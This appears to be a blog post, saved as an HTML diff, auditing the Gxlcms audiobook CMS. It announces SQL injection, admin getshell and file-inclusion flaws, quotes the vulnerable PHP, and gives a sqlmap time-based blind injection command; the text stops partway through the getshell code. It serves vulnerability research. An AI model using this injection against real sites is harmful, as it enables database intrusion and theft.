@@ -1,0 +1,502 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>gxlcms代码审计 | lufei&#39;s blog</title>
+  <meta name="description" content="0x00 前言审计出三个漏洞1.SQL时间盲注漏洞2.后台GetShell3.鸡肋本地包含漏洞 0x01 CMS介绍官网地址：http:&#x2F;&#x2F;www.gxlcms.com&#x2F;Gxlcms有声小说系统是一件采集快速建立一个听书站。用PHP写的，最新版要求PHP&gt;5.4。使用了THINKPHP框架。 源码下载地址：http:&#x2F;&#x2F;bbs.gxlcms.com&#x2F;article&#x2F;1 0x03 SQL盲注漏">
+<meta property="og:type" content="article">
+<meta property="og:title" content="gxlcms代码审计">
+<meta property="og:url" content="https://lufe1.cn/2017/09/09/gxlcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/index.html">
+<meta property="og:site_name" content="lufei&#39;s blog">
+<meta property="og:description" content="0x00 前言审计出三个漏洞1.SQL时间盲注漏洞2.后台GetShell3.鸡肋本地包含漏洞 0x01 CMS介绍官网地址：http:&#x2F;&#x2F;www.gxlcms.com&#x2F;Gxlcms有声小说系统是一件采集快速建立一个听书站。用PHP写的，最新版要求PHP&gt;5.4。使用了THINKPHP框架。 源码下载地址：http:&#x2F;&#x2F;bbs.gxlcms.com&#x2F;article&#x2F;1 0x03 SQL盲注漏">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://image.lufe1.cn/gxlcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1.jpg">
+<meta property="og:image" content="https://image.lufe1.cn/gxlcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/2.jpg">
+<meta property="article:published_time" content="2017-09-08T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-09-02T16:06:17.038Z">
+<meta property="article:author" content="lufei@湘ICP备17016147号-1">
+<meta property="article:tag" content="代码审计">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://image.lufe1.cn/gxlcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1.jpg">
+  <!-- Canonical links -->
+  <link rel="canonical" href="https://lufe1.cn/2017/09/09/gxlcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="lufei&#39;s blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.ico" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body class="main-center" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/lufeirider" target="_blank">
+          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">lufei</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">网络安全</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Shenzhen, China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="Search" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">Home</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">Archives</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">Categories</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">Tags</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-repository">
+          <a href="/repository">
+            
+            <i class="icon icon-project"></i>
+            
+            <span class="menu-title">Repository</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-books">
+          <a href="/books">
+            
+            <i class="icon icon-book-fill"></i>
+            
+            <span class="menu-title">Books</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="icon icon-friendship"></i>
+            
+            <span class="menu-title">Links</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">About</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/lufeirider" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="http://weibo.com/lufeirider" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="https://twitter.com/lufeirider" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="https://www.behance.net/lufeirider" target="_blank" title="Behance" data-toggle=tooltip data-placement=top><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">Board</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>欢迎交流与分享经验!</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget-body">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Android/">Android</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a><span class="category-list-count">14</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%A3%E7%A0%81/">代码</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%85%8D%E6%9D%80/">免杀</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%89%8D%E7%AB%AF/">前端</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%8E%9F%E5%88%9B%E5%B7%A5%E5%85%B7/">原创工具</a><span class="category-list-count">25</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%B7%A5%E5%85%B7%E4%BF%AE%E6%94%B9/">工具修改</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/">恶意代码分析</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%8A%80%E5%B7%A7/">技巧</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%8C%96%E6%B4%9E/">挖洞</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%83%E9%99%90/">权限</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C/">网络</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%84%B1%E5%A3%B3/">脱壳</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%98%B2%E5%BE%A1/">防御</a><span class="category-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget-body">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android/" rel="tag">Android</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a><span class="tag-list-count">14</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81/" rel="tag">代码</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%85%8D%E6%9D%80/" rel="tag">免杀</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%89%8D%E7%AB%AF/" rel="tag">前端</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8E%9F%E5%88%9B%E5%B7%A5%E5%85%B7/" rel="tag">原创工具</a><span class="tag-list-count">25</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7%E4%BF%AE%E6%94%B9/" rel="tag">工具修改</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/" rel="tag">恶意代码分析</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8A%80%E5%B7%A7/" rel="tag">技巧</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8C%96%E6%B4%9E/" rel="tag">挖洞</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%83%E9%99%90/" rel="tag">权限</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C/" rel="tag">网络</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%84%B1%E5%A3%B3/" rel="tag">脱壳</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%98%B2%E5%BE%A1/" rel="tag">防御</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+  </div>
+</aside>
+
+  
+  
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-gxlcms代码审计" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      gxlcms代码审计
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2017/09/09/gxlcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="article-date">
+	  <time datetime="2017-09-08T16:00:00.000Z" itemprop="datePublished">2017-09-09</time>
+	</a>
+</span>
+        
+  <span class="article-category">
+    <i class="icon icon-folder"></i>
+    <a class="article-category-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+  </span>
+
+        
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a>
+  </span>
+
+
+        
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2017/09/09/gxlcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/#comments" class="article-comment-link">Comments</a></span>
+        
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <h4 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h4><p>审计出三个漏洞<br>1.SQL时间盲注漏洞<br>2.后台GetShell<br>3.鸡肋本地包含漏洞</p>
+<h4 id="0x01-CMS介绍"><a href="#0x01-CMS介绍" class="headerlink" title="0x01 CMS介绍"></a>0x01 CMS介绍</h4><p>官网地址：<a target="_blank" rel="noopener" href="http://www.gxlcms.com/">http://www.gxlcms.com/</a><br>Gxlcms有声小说系统是一件采集快速建立一个听书站。用PHP写的，最新版要求PHP&gt;5.4。使用了THINKPHP框架。</p>
+<p>源码下载地址：<a target="_blank" rel="noopener" href="http://bbs.gxlcms.com/article/1">http://bbs.gxlcms.com/article/1</a></p>
+<h4 id="0x03-SQL盲注"><a href="#0x03-SQL盲注" class="headerlink" title="0x03 SQL盲注"></a>0x03 SQL盲注</h4><p>漏洞文件：Lib\Home\Action\UpdownAction.class.php<br>漏洞代码：show函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$id</span>,<span class="variable">$type</span>,<span class="variable">$model</span>=<span class="string">&#x27;ting&#x27;</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$rs</span> = D(ucfirst(<span class="variable">$model</span>));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$type</span>)&#123;</span><br><span class="line">        <span class="variable">$cookie</span> = <span class="variable">$model</span>.<span class="string">&#x27;-updown-&#x27;</span>.<span class="variable">$id</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="variable">$cookie</span>]))&#123;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;data&#x27;</span>]=<span class="number">0</span>;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;info&#x27;</span>]=<span class="string">&quot;您已操作过，晚点再试！&quot;</span>;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;status&#x27;</span>]=<span class="number">0</span>;    </span><br><span class="line">            <span class="keyword">$this</span>-&gt;ajaxReturn(<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&#x27;up&#x27;</span> == <span class="variable">$type</span>)&#123;</span><br><span class="line">            <span class="variable">$rs</span>-&gt;where(<span class="keyword">array</span>(<span class="string">&#x27;ting_id&#x27;</span>=&gt;<span class="variable">$id</span>))-&gt;setInc(<span class="variable">$model</span>.<span class="string">&#x27;_up&#x27;</span>);</span><br><span class="line">            setcookie(<span class="variable">$cookie</span>, <span class="string">&#x27;true&#x27;</span>, time()+intval(C(<span class="string">&#x27;user_second&#x27;</span>)));</span><br><span class="line">        &#125;<span class="keyword">elseif</span>( <span class="string">&#x27;down&#x27;</span> == <span class="variable">$type</span>)</span><br><span class="line">            <span class="variable">$rs</span>-&gt;where(<span class="keyword">array</span>(<span class="string">&#x27;ting_id&#x27;</span>=&gt;<span class="variable">$id</span>))-&gt;setInc(<span class="variable">$model</span>.<span class="string">&#x27;_down&#x27;</span>);</span><br><span class="line">            setcookie(<span class="variable">$cookie</span>, <span class="string">&#x27;true&#x27;</span>, time()+intval(C(<span class="string">&#x27;user_second&#x27;</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$array</span> = <span class="variable">$rs</span>-&gt;field(<span class="string">&#x27;&#x27;</span>.<span class="variable">$model</span>.<span class="string">&#x27;_up,&#x27;</span>.<span class="variable">$model</span>.<span class="string">&#x27;_down&#x27;</span>)-&gt;find(<span class="variable">$id</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$array</span>) &#123;</span><br><span class="line">        <span class="variable">$array</span>[<span class="variable">$model</span>.<span class="string">&#x27;_up&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$array</span>[<span class="variable">$model</span>.<span class="string">&#x27;_down&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$arrays</span>[<span class="string">&#x27;data&#x27;</span>]=<span class="variable">$array</span>[<span class="variable">$model</span>.<span class="string">&#x27;_up&#x27;</span>].<span class="string">&#x27;:&#x27;</span>.<span class="variable">$array</span>[<span class="variable">$model</span>.<span class="string">&#x27;_down&#x27;</span>];</span><br><span class="line">    <span class="variable">$arrays</span>[<span class="string">&#x27;info&#x27;</span>]=<span class="string">&quot;感谢您的参与，操作成功！&quot;</span>;</span><br><span class="line">    <span class="variable">$arrays</span>[<span class="string">&#x27;status&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;ajaxReturn(<span class="variable">$arrays</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//echo($array[$model.&#x27;_up&#x27;].&#x27;:&#x27;.$array[$model.&#x27;_down&#x27;]);            </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这套CMS使用了THINKPHP框架（自带SQL防注入功能），但是还是存在SQL注入。首先来看下这个函数，这个函数有三个变量：id，type，model。$id经过where方法，而最终经过THINKPHP框架只的parseValue，对单引号进行过滤的。$type，只是进行一个if判断，没有进入mysql语句中。最终出现问题的是出现在$model变量上。</p>
+<p>field中调用了$model变量，不过没对$model变量进行过滤，可以进行SQL注入，不过只能进行SQL时间盲注。</p>
+<p>可以使用SQLMAP进行注入：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap --dbms=mysql --technique=T -u <span class="string">&quot;http://127.0.0.1/index.php?s=updown-show--id-1-type-1-model-1*&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>在以前的老版本中，还有类似的SQL注入，不过新版本修复了。<br>文件：Lib\Lib\Action\Home\HitsAction.class.php<br>函数：show()<br>与上面类似。就不贴代码了。</p>
+<h4 id="0x04-后台GetShell"><a href="#0x04-后台GetShell" class="headerlink" title="0x04 后台GetShell"></a>0x04 后台GetShell</h4><p>漏洞文件：Lib\Admin\Action\AdminAction.class.php<br>漏洞函数：configsave()</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">configsave</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$config</span> = <span class="variable">$_POST</span>[<span class="string">&quot;config&quot;</span>];</span><br><span class="line">    <span class="variable">$config</span>[<span class="string">&quot;site_tongji&quot;</span>] = stripslashes(<span class="variable">$config</span>[<span class="string">&quot;site_tongji&quot;</span>]);</span><br><span class="line">    <span class="variable">$config</span>[<span class="string">&quot;play_collect_content&quot;</span>] = stripslashes(<span class="variable">$config</span>[<span class="string">&quot;play_collect_content&quot;</span>]);</span><br><span class="line">    <span class="variable">$config</span>[<span class="string">&quot;admin_time_edit&quot;</span>] = (<span class="keyword">bool</span>) <span class="variable">$config</span>[<span class="string">&quot;admin_time_edit&quot;</span>];</span><br><span class="line">    <span class="variable">$config</span>[<span class="string">&quot;url_tingdata&quot;</span>] = trim(<span class="variable">$config</span>[<span class="string">&quot;url_tingdata&quot;</span>]);</span><br><span class="line">    <span class="variable">$config</span>[<span class="string">&quot;url_newsdata&quot;</span>] = trim(<span class="variable">$config</span>[<span class="string">&quot;url_newsdata&quot;</span>]);</span><br><span class="line">    <span class="variable">$config</span>[<span class="string">&quot;upload_path&quot;</span>] = str_replace(<span class="keyword">array</span>(<span class="string">&quot;..&quot;</span>, <span class="string">&quot;//&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="variable">$config</span>[<span class="string">&quot;upload_path&quot;</span>]);</span><br><span class="line">    <span class="variable">$config</span>[<span class="string">&quot;upload_class&quot;</span>] = trim(str_replace(<span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;asp&quot;</span>, <span class="string">&quot;apsx&quot;</span>, <span class="string">&quot;txt&quot;</span>, <span class="string">&quot;asax&quot;</span>, <span class="string">&quot;ascx&quot;</span>, <span class="string">&quot;cdx&quot;</span>, <span class="string">&quot;cer&quot;</span>, <span class="string">&quot;cgi&quot;</span>, <span class="string">&quot;jsp&quot;</span>, <span class="string">&quot;html&quot;</span>, <span class="string">&quot;html&quot;</span>, <span class="string">&quot;htm&quot;</span>, <span class="string">&quot;,,&quot;</span>), <span class="string">&quot;&quot;</span>, strtolower(<span class="variable">$config</span>[<span class="string">&quot;upload_class&quot;</span>])), <span class="string">&quot;,&quot;</span>);</span><br><span class="line">    <span class="variable">$config</span>[<span class="string">&quot;upload_thumb&quot;</span>] = (<span class="keyword">bool</span>) <span class="variable">$config</span>[<span class="string">&quot;upload_thumb&quot;</span>];</span><br><span class="line">    <span class="variable">$config</span>[<span class="string">&quot;upload_water&quot;</span>] = (<span class="keyword">bool</span>) <span class="variable">$config</span>[<span class="string">&quot;upload_water&quot;</span>];</span><br><span class="line">    <span class="variable">$config</span>[<span class="string">&quot;upload_http&quot;</span>] = (<span class="keyword">bool</span>) <span class="variable">$config</span>[<span class="string">&quot;upload_http&quot;</span>];</span><br><span class="line">    <span class="variable">$config</span>[<span class="string">&quot;upload_ftp&quot;</span>] = (<span class="keyword">bool</span>) <span class="variable">$config</span>[<span class="string">&quot;upload_ftp&quot;</span>];</span><br><span class="line">    <span class="variable">$config</span>[<span class="string">&quot;play_collect&quot;</span>] = (<span class="keyword">bool</span>) <span class="variable">$config</span>[<span class="string">&quot;play_collect&quot;</span>];</span><br><span class="line">    <span class="variable">$config</span>[<span class="string">&quot;play_second&quot;</span>] = intval(<span class="variable">$config</span>[<span class="string">&quot;play_second&quot;</span>]);</span><br><span class="line">    <span class="variable">$config</span>[<span class="string">&quot;tmpl_cache_on&quot;</span>] = (<span class="keyword">bool</span>) <span class="variable">$config</span>[<span class="string">&quot;tmpl_cache_on&quot;</span>];</span><br><span class="line">    <span class="variable">$config</span>[<span class="string">&quot;html_cache_on&quot;</span>] = (<span class="keyword">bool</span>) <span class="variable">$config</span>[<span class="string">&quot;html_cache_on&quot;</span>];</span><br><span class="line">    <span class="variable">$config</span>[<span class="string">&quot;user_gbcm&quot;</span>] = (<span class="keyword">bool</span>) <span class="variable">$config</span>[<span class="string">&quot;user_gbcm&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (explode(chr(<span class="number">13</span>), trim(<span class="variable">$config</span>[<span class="string">&quot;play_server&quot;</span>])) <span class="keyword">as</span> <span class="variable">$v</span> ) &#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$key</span>, <span class="variable">$val</span>) = explode(<span class="string">&quot;$\$\$&quot;</span>, trim(<span class="variable">$v</span>));</span><br><span class="line">        <span class="variable">$arrserver</span>[trim(<span class="variable">$key</span>)] = trim(<span class="variable">$val</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$config</span>[<span class="string">&quot;play_server&quot;</span>] = <span class="variable">$arrserver</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (explode(chr(<span class="number">13</span>), trim(<span class="variable">$config</span>[<span class="string">&quot;play_collect_content&quot;</span>])) <span class="keyword">as</span> <span class="variable">$v</span> ) &#123;</span><br><span class="line">        <span class="variable">$arrcollect</span>[] = trim(<span class="variable">$v</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$config</span>[<span class="string">&quot;play_collect_content&quot;</span>] = <span class="variable">$arrcollect</span>;</span><br><span class="line">    <span class="variable">$config</span>[<span class="string">&quot;html_cache_time&quot;</span>] = <span class="variable">$config</span>[<span class="string">&quot;html_cache_time&quot;</span>] * <span class="number">3600</span>;</span><br><span class="line"></span><br><span 